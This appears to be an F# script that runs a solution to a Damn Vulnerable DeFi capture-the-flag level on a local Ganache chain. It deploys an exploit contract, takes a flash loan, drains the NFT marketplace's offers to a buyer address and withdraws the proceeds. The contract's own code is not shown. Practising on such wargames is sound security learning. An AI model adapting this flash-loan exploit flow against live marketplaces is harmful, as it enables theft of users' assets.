#i """nuget: C:\Users\jon_h\source\repos\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.3.0" 
#load "Common.fsx"
#load "Deployers/DeployLevel10.fsx"
#load "DamnValuableNFTBindings.fsx"

open web3.fs
open Common
open DeployLevel10
open DamnValuableNFTBindings

let stipend = (Ether ".5") |> asWei
let flashloanAmount = (Ether "15") |> asWei

let marketplaceExploitABI = returnABIFromFile """C:\Users\jon_h\source\repos\DamnVulnerableDeFi\bin\MarketPlaceExploit.abi"""
let marketplaceExploitBytecode = returnBytecodeFromFile """C:\Users\jon_h\source\repos\DamnVulnerableDeFi\bin\MarketPlaceExploit.json"""

// check that there are NFTs on offer...
//makeEthCall marketplace (ByName "amountOfOffers") [] devEnvironment2 |> logIt

// check the owner of token 0, to compare to later
ownerOf "0" nftContract devEnvironment2 |> logIt

let exploiter = 
    prepareDeployAndLoadContract 
        marketplaceExploitBytecode 
        marketplaceExploitABI 
        GANACHE 
        [Address nftContract.address; Address marketplace.address ; Address buyer.address;] 
        stipend 
        devEnvironment2 
        |> optimisticallyBindDeployedContract


makeEthTxn exploiter (ByName "takeFlashLoan") [Uint256 flashloanAmount] ZEROV devEnvironment2 |> logIt
makeEthTxn exploiter (ByName "sendNFTsToBuyer") [] ZEROV devEnvironment2 |> logIt
makeEthTxn exploiter (ByName "withdraw") [] ZEROV devEnvironment2 |> logIt

// Should come back 0
makeEthCall marketplace (ByName "amountOfOffers") [] devEnvironment2 |> logIt

// should come back equal to buyer
ownerOf "0" nftContract devEnvironment2 |> logIt
